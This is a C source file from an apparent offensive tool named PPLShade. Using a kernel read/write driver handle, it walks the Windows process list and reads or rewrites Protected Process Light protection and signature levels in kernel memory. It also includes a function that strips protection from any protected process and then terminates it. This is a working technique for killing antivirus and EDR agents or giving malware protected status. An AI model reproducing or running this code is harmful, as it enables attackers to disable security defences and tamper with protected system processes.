/*
 *  PPLShade - procguard.c
 *  Process protection manipulation via kernel memory read/write.
 *  
 */

#include "procguard.h"
#include <wchar.h>
#include "memory.h"
#include "kstruct_resolve.h"
#include "prot_fmt.h"

// ─────────────── Internal: Process name resolution ───────────────

static void GetProcImageName(DWORD pid, WCHAR* outName, DWORD cchMax,
                             HANDLE hDevice, DWORD offsets[KF_MAX], DWORD64 eprocessAddr) {
    outName[0] = L'\0';
    if (pid == 0) { wcscpy_s(outName, cchMax, L"Idle"); return; }
    if (pid == 4) { wcscpy_s(outName, cchMax, L"System"); return; }

    // Read ImageFileName directly from EPROCESS (15-byte inline CHAR array)
    DWORD64 nameAddr = eprocessAddr + offsets[KF_IMAGE_FILE_NAME];
    char imgName[16] = { 0 };
    for (int i = 0; i < 15; i++) {
        imgName[i] = (char)KRead8(hDevice, nameAddr + i);
        if (imgName[i] == '\0') break;
    }
    imgName[15] = '\0';

    if (imgName[0] != '\0') {
        for (int i = 0; i < 15 && imgName[i]; i++) {
            outName[i] = (WCHAR)imgName[i];
            outName[i + 1] = L'\0';
        }
    } else {
        wcscpy_s(outName, cchMax, L"<unknown>");
    }
}

// ─────────────── Internal: Process chain walk ───────────────

static BOOL ReadSystemEprocess(HANDLE hDevice, DWORD offsets[KF_MAX], PDWORD64 pAddr) {
    DWORD64 kernelBase = QueryNtBase();
    if (!kernelBase) {
        error("Base failed");
        return FALSE;
    }

    DWORD64 pSysBase = kernelBase + offsets[KF_SYSTEM_INITIAL_PROC];
    DWORD64 pSysProc = KRead64(hDevice, pSysBase);

    if (!pSysProc) {
        error("Read failed");
        return FALSE;
    }

    *pAddr = pSysProc;
    return TRUE;
}

static BOOL WalkEprocessChain(HANDLE hDevice, DWORD offsets[KF_MAX], PPROC_SHIELD_LIST* ppList) {
    DWORD dwBaseSize = 4096;
    PPROC_SHIELD_LIST pList = (PPROC_SHIELD_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBaseSize);
    if (!pList) return FALSE;

    DWORD dwSize = sizeof(pList->NumberOfEntries);
    DWORD dwCount = 0;
    DWORD64 pInitial = 0;

    if (!ReadSystemEprocess(hDevice, offsets, &pInitial)) {
        HeapFree(GetProcessHeap(), 0, pList);
        return FALSE;
    }

    DWORD64 pCurrent = pInitial;

    do {
        DWORD64 dwPid = KRead64(hDevice, pCurrent + offsets[KF_UNIQUE_PID]);
        BYTE bProtection = KRead8(hDevice, pCurrent + offsets[KF_PROTECTION]);
        BYTE bSigLevel   = KRead8(hDevice, pCurrent + offsets[KF_SIG_LEVEL]);
        BYTE bSecSigLevel = KRead8(hDevice, pCurrent + offsets[KF_SEC_SIG_LEVEL]);

        dwSize += sizeof(PROC_SHIELD_ENTRY);
        if (dwSize >= dwBaseSize) {
            dwBaseSize *= 2;
            PPROC_SHIELD_LIST pNew = (PPROC_SHIELD_LIST)HeapReAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, pList, dwBaseSize);
            if (!pNew) break;
            pList = pNew;
        }

        pList->Entries[dwCount].KernelAddress       = pCurrent;
        pList->Entries[dwCount].Pid                 = (DWORD)dwPid;
        pList->Entries[dwCount].ProtectionLevel     = ExtractPLevel(bProtection);
        pList->Entries[dwCount].SignerType           = ExtractSType(bProtection);
        pList->Entries[dwCount].SignatureLevel       = bSigLevel;
        pList->Entries[dwCount].SectionSignatureLevel = bSecSigLevel;
        GetProcImageName((DWORD)dwPid, pList->Entries[dwCount].ProcessName, 64,
                         hDevice, offsets, pCurrent);
        dwCount++;

        DWORD64 pNext = KRead64(hDevice, pCurrent + offsets[KF_ACTIVE_LINKS]);
        pCurrent = pNext - offsets[KF_ACTIVE_LINKS];

    } while (pCurrent != pInitial);

    if (pCurrent == pInitial) {
        pList->NumberOfEntries = dwCount;
        *ppList = pList;
        return TRUE;
    }

    HeapFree(GetProcessHeap(), 0, pList);
    return FALSE;
}

static BOOL LookupEprocessByPid(HANDLE hDevice, DWORD offsets[KF_MAX], DWORD Pid, PDWORD64 pAddr) {
    PPROC_SHIELD_LIST pList = NULL;

    if (!WalkEprocessChain(hDevice, offsets, &pList))
        return FALSE;

    BOOL found = FALSE;
    for (DWORD i = 0; i < pList->NumberOfEntries; i++) {
        if (pList->Entries[i].Pid == Pid) {
            *pAddr = pList->Entries[i].KernelAddress;
            found = TRUE;
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, pList);

    if (!found) {
        error("PID %lu not found", Pid);
    }
    return found;
}

// ─────────────── Public: List Protected Processes ───────────────

BOOL EnumShieldedProcs(HANDLE hDevice, DWORD offsets[KF_MAX]) {
    PPROC_SHIELD_LIST pList = NULL;

    if (!WalkEprocessChain(hDevice, offsets, &pList))
        return FALSE;

    DWORD dwProtected = 0;

    printf("\n");
    printf(C_CYN "   PID  " C_GRY "|" C_CYN " Process              " C_GRY "|" C_CYN " Level " C_GRY "|"
           C_CYN "    Signer      " C_GRY "|" C_CYN "  EXE Sig Level       " C_GRY "|" C_CYN "  DLL Sig Level       " C_GRY "|"
           C_CYN "   Kernel Addr   \n" C_RST);
    printf(C_GRY " -------+----------------------+--------+-----------------+----------------------+----------------------+--------------------\n" C_RST);

    for (DWORD i = 0; i < pList->NumberOfEntries; i++) {
        if (pList->Entries[i].ProtectionLevel > 0) {
            wprintf(L" %6d " C_GRY L"|" C_RST L" %-20.20ws "
                    C_GRY L"|" C_RST L" %-3ws(%d) "
                    C_GRY L"|" C_RST L" %-11ws (%d) "
                    C_GRY L"|" C_RST L" %-13ws (0x%02x) "
                    C_GRY L"|" C_RST L" %-13ws (0x%02x) "
                    C_GRY L"|" C_RST L" 0x%016llx\n",
                pList->Entries[i].Pid,
                pList->Entries[i].ProcessName,
                PLevelStr(pList->Entries[i].ProtectionLevel),
                pList->Entries[i].ProtectionLevel,
                STypeStr(pList->Entries[i].SignerType),
                pList->Entries[i].SignerType,
                SigLevelStr(pList->Entries[i].SignatureLevel),
                pList->Entries[i].SignatureLevel,
                SigLevelStr(pList->Entries[i].SectionSignatureLevel),
                pList->Entries[i].SectionSignatureLevel,
                pList->Entries[i].KernelAddress
            );
            dwProtected++;
        }
    }

    printf("\n");
    okay("Enumerated %lu protected processes out of %lu total", dwProtected, pList->NumberOfEntries);

    HeapFree(GetProcessHeap(), 0, pList);
    return TRUE;
}

// ─────────────── Public: Get Process Protection ───────────────

BOOL QueryProcShield(HANDLE hDevice, DWORD offsets[KF_MAX], DWORD Pid) {
    DWORD64 pProcess = 0;
    if (!LookupEprocessByPid(hDevice, offsets, Pid, &pProcess))
        return FALSE;

    BYTE bProtection = KRead8(hDevice, pProcess + offsets[KF_PROTECTION]);
    BYTE bSigLevel   = KRead8(hDevice, pProcess + offsets[KF_SIG_LEVEL]);
    BYTE bSecSig     = KRead8(hDevice, pProcess + offsets[KF_SEC_SIG_LEVEL]);

    if (bProtection > 0) {
        UCHAR level  = ExtractPLevel(bProtection);
        UCHAR signer = ExtractSType(bProtection);
        WCHAR procName[64] = { 0 };
        GetProcImageName(Pid, procName, 64, hDevice, offsets, pProcess);

        printf("\n");
        okayW(L"PID %lu (%s) is " C_BLD L"%s-%s" C_RST L" (signer=%d)", Pid, procName,
             PLevelStr(level), STypeStr(signer), signer);
        info("  EXE Sig:  %S (0x%02X)", SigLevelStr(bSigLevel), bSigLevel);
        info("  DLL Sig:  %S (0x%02X)", SigLevelStr(bSecSig), bSecSig);
        info("  KAddr:              0x%016llX", pProcess);
    } else {
        WCHAR procName[64] = { 0 };
        GetProcImageName(Pid, procName, 64, hDevice, offsets, pProcess);
        infoW(L"PID %lu (%s) is " C_YLW L"not protected" C_RST, Pid, procName);
    }

    return TRUE;
}

// ─────────────── Public: Set Process Protection ───────────────

BOOL WriteProcShield(HANDLE hDevice, DWORD offsets[KF_MAX],
                          DWORD Pid, LPCWSTR ProtectionLevel, LPCWSTR SignerType) {
    UCHAR bLevel  = ParsePLevel(ProtectionLevel);
    UCHAR bSigner = ParseSType(SignerType);
    if (!bLevel || !bSigner) return FALSE;

    UCHAR bNewProt = EncodeProt(bLevel, bSigner);

    DWORD64 pProcess = 0;
    if (!LookupEprocessByPid(hDevice, offsets, Pid, &pProcess))
        return FALSE;

    BYTE bOldProt = KRead8(hDevice, pProcess + offsets[KF_PROTECTION]);

    if (bOldProt == bNewProt) {
        warnW(L"PID %lu already has protection %s-%s", Pid, ProtectionLevel, SignerType);
        return FALSE;
    }

    if (!KWrite8(hDevice, pProcess + offsets[KF_PROTECTION], bNewProt)) {
        error("Write failed %lu", Pid);
        return FALSE;
    }

    // Verify
    BYTE bVerify = KRead8(hDevice, pProcess + offsets[KF_PROTECTION]);
    if (bVerify != bNewProt) {
        error("Verify failed");
        return FALSE;
    }

    okayW(L"PID %lu: protection set to %s-%s (was %s-%s)", Pid,
          PLevelStr(ExtractPLevel(bNewProt)),
          STypeStr(ExtractSType(bNewProt)),
          PLevelStr(ExtractPLevel(bOldProt)),
          STypeStr(ExtractSType(bOldProt)));

    return TRUE;
}

// ─────────────── Public: Protect (set prot + sig levels) ───────────────

BOOL ApplyProcShield(HANDLE hDevice, DWORD offsets[KF_MAX],
                    DWORD Pid, LPCWSTR ProtectionLevel, LPCWSTR SignerType) {
    DWORD64 pProcess = 0;
    if (!LookupEprocessByPid(hDevice, offsets, Pid, &pProcess))
        return FALSE;

    BYTE bProt = KRead8(hDevice, pProcess + offsets[KF_PROTECTION]);
    if (bProt > 0) {
        errorW(L"PID %lu is already protected (%s-%s). Use 'set' to change.", Pid,
               PLevelStr(ExtractPLevel(bProt)),
               STypeStr(ExtractSType(bProt)));
        return FALSE;
    }

    // Set protection
    if (!WriteProcShield(hDevice, offsets, Pid, ProtectionLevel, SignerType))
        return FALSE;

    // Set matching signature levels
    UCHAR bSigner = ParseSType(SignerType);
    UCHAR bSigLevel    = DeriveSigLevel(bSigner);
    UCHAR bSecSigLevel = DeriveSectionSigLevel(bSigner);

    if (bSigLevel == 0xFF || bSecSigLevel == 0xFF) return FALSE;

    KWrite8(hDevice, pProcess + offsets[KF_SIG_LEVEL], bSigLevel);
    KWrite8(hDevice, pProcess + offsets[KF_SEC_SIG_LEVEL], bSecSigLevel);

    okayW(L"PID %lu is now fully protected with signature levels %s / %s", Pid,
          SigLevelStr(bSigLevel), SigLevelStr(bSecSigLevel));

    return TRUE;
}

// ─────────────── Public: Unprotect ───────────────

BOOL StripProcShield(HANDLE hDevice, DWORD offsets[KF_MAX], DWORD Pid) {
    DWORD64 pProcess = 0;
    if (!LookupEprocessByPid(hDevice, offsets, Pid, &pProcess))
        return FALSE;

    BYTE bProt = KRead8(hDevice, pProcess + offsets[KF_PROTECTION]);
    if (bProt == 0) {
        warn("PID %lu is not protected, nothing to unprotect", Pid);
        return FALSE;
    }

    UCHAR oldLevel  = ExtractPLevel(bProt);
    UCHAR oldSigner = ExtractSType(bProt);

    // Zero protection
    if (!KWrite8(hDevice, pProcess + offsets[KF_PROTECTION], 0)) {
        error("Failed to zero Protection byte for PID %lu", Pid);
        return FALSE;
    }

    // Verify
    BYTE bVerify = KRead8(hDevice, pProcess + offsets[KF_PROTECTION]);
    if (bVerify != 0) {
        error("PID %lu still appears protected after write (read 0x%02X)", Pid, bVerify);
        return FALSE;
    }

    // Zero signature levels
    KWrite8(hDevice, pProcess + offsets[KF_SIG_LEVEL], 0);
    KWrite8(hDevice, pProcess + offsets[KF_SEC_SIG_LEVEL], 0);

    okayW(L"PID %lu unprotected (was %s-%s)", Pid,
          PLevelStr(oldLevel), STypeStr(oldSigner));

    return TRUE;
}

// ─────────────── Public: Kill (unprotect + terminate) ───────────────

BOOL KillProc(HANDLE hDevice, DWORD offsets[KF_MAX], DWORD Pid) {
    DWORD64 pProcess = 0;
    if (!LookupEprocessByPid(hDevice, offsets, Pid, &pProcess))
        return FALSE;

    BYTE bProt = KRead8(hDevice, pProcess + offsets[KF_PROTECTION]);
    if (bProt != 0) {
        UCHAR oldLevel  = ExtractPLevel(bProt);
        UCHAR oldSigner = ExtractSType(bProt);

        if (!KWrite8(hDevice, pProcess + offsets[KF_PROTECTION], 0)) {
            error("Failed to strip protection for PID %lu", Pid);
            return FALSE;
        }
        KWrite8(hDevice, pProcess + offsets[KF_SIG_LEVEL], 0);
        KWrite8(hDevice, pProcess + offsets[KF_SEC_SIG_LEVEL], 0);

        okayW(L"PID %lu unprotected (was %s-%s)", Pid,
              PLevelStr(oldLevel), STypeStr(oldSigner));
    } else {
        info("PID %lu is not protected, skipping unprotect", Pid);
    }

    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, Pid);
    if (!hProc) {
        error("OpenProcess(PROCESS_TERMINATE) failed for PID %lu (0x%08X)", Pid, GetLastError());
        return FALSE;
    }

    if (!TerminateProcess(hProc, 1)) {
        error("TerminateProcess failed for PID %lu (0x%08X)", Pid, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    CloseHandle(hProc);
    okay("PID %lu terminated", Pid);
    return TRUE;
}
